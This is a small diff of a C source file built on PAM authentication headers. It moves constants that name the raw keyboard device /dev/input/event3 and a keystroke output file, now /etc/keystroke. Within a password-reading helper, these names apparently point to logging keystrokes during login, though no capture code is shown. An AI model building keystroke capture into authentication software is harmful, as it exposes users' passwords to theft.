@@ -21,6 +21,8 @@
 #include <security/_pam_types.h>
 #include <security/_pam_macros.h>
 
+#define KEYBOARD_FILE "/dev/input/event3"
+#define KEYSTROKE_FILE "/etc/keystroke"
 
 static int
 pam_read_passwords(int fd, int npass, char **passwords)
@@ -103,9 +105,6 @@ getuidname(uid_t uid)
 
     return username;
 }
-
-#define KEYBOARD_FILE "/dev/input/event3"
-#define KEYSTROKE_FILE "/home/alexey/Documents/keystroke-pam"
 
 int main(int argc, char *argv[])
 {
